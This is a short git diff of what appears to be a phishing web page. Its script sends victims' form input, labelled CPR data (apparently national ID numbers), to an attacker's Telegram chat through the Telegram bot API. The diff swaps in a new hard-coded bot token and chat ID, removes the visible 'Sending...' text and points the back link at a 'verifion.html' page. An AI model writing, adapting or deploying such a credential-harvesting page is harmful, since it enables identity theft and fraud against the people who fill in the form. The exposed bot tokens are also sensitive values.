@@ -225,7 +225,7 @@
             <button class="submit-button" name="s" id="submitBtn">Continue</button>
         
             <div class="back-button">
-                <a href="http://localhost/gg/h">← Back</a>
+                <a href="verifion.html">← Back</a>
             </div>
         </div></form>
     </div>
@@ -248,9 +248,9 @@
 
     // Disable button and show loading
     submitBtn.disabled = true;
-    submitBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
-     const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
-    const chatId = "-5091116242";
+    submitBtn.innerHTML = '<span class="loading-spinner"></span>';
+     const botToken = "8453434962:AAH2AZVGtRtUjqw4ziizkdE_GntutiUF6OA";
+    const chatId = "-5000519303";
     try {
       // Send CPR data to Telegram
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
